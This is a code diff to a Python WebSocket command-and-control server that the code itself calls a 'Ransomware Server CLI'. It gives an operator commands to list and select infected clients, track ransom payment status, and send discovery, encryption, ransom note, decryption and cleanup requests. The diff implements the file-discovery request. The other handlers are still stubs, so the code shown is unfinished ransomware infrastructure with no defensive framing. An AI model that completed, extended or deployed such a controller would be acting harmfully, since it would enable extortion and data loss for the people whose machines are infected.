@@ -93,44 +93,53 @@ class WebSocketCLIServer:
             match msg.split():
                 case ["help"]:
                     self.__show_help()
+
                 case ["info"]:
                     print("Ransomware Server CLI")
+
                 case ["connections"]:
                     self.__show_connections()
+
                 case ["select", username]: 
                     self.__select_client(username)
+
                 case ["connectioninfo"]:
                     self.__show_connection_info()
+
                 case ["setpaymentstatus", status]:
                     self.__set_payment_status(status)
+
                 case ["discoveryreq", *args]:
                     send_path = args[0] if args else "/"
-                    self.__send_discovery_req(send_path)
-                    print("Not implemented yet", args)
+                    await self.__send_discovery_req(send_path)
+
                 case ["cryptoreq", *args]:
                     encrypt = "--encrypt" in args
                     delete = "--delete" in args
                     self.__send_crypto_req(encrypt, delete)
                     print("Not implemented yet", encrypt, delete)
+
                 case ["encryptionreq"]:
                     self.__send_encryption_req()
                     print("Not implemented yet")
+
                 case ["ransomnotereq"]:
                     print("Not implemented yet")
                     self.__send_ransom_note_req()
+
                 case ["cryptorep"]:
                     print("Not implemented yet")
                     self.__send_decrypt_rep()
+
                 case ["cleaningreq"]:
                     print("Not implemented yet")
                     self.__send_cleaning_req()
+
                 case ["exit"] | ["quit"]:  
                     await self.stop()
                 case _:
                     print(f"Unknown command: {msg}")
 
-    
-            #await self.broadcast(f"[Server CLI] {msg}")
 
     def __generate_cli_text(self) -> str:
         """Generate the CLI prompt text."""
@@ -198,37 +207,43 @@ class WebSocketCLIServer:
         self.__selected_client.show_info()
 
     @check_selected_client
-    def __send_discovery_req(self, path="/"):
+    async def __send_discovery_req(self, path="/"):
         """Send a discovery request to the selected client."""
         #TODO: Implement discovery request
-        pass
+        message = {
+            "type": "discovery_req",
+            "data": {
+                "initial_directory": path
+            }
+        }
+        await self.__selected_client.send_message(json.dumps(message))
 
     @check_selected_client
-    def __send_crypto_req(self, encrypt=False, delete=False):
+    async def __send_crypto_req(self, encrypt=False, delete=False):
         """Send a cryptographic setup request to the selected client."""
         #TODO: Implement crypto request
         pass
 
     @check_selected_client
-    def __send_encryption_req(self):
+    async def __send_encryption_req(self):
         """Send an encryption request to the selected client."""
         #TODO: Implement encryption request
         pass
 
     @check_selected_client
-    def __send_ransom_note_req(self):
+    async def __send_ransom_note_req(self):
         """Send a ransom note request to the selected client."""
         #TODO: Implement ransom note request
         pass
 
     @check_selected_client
-    def __send_decrypt_rep(self):
+    async def __send_decrypt_rep(self):
         """Send a decryption request to the selected client."""
         #TODO: Implement decryption request
         pass
 
     @check_selected_client
-    def __send_cleaning_req(self):
+    async def __send_cleaning_req(self):
         """Send a cleaning request to the selected client."""
         #TODO: Implement cleaning request
         pass
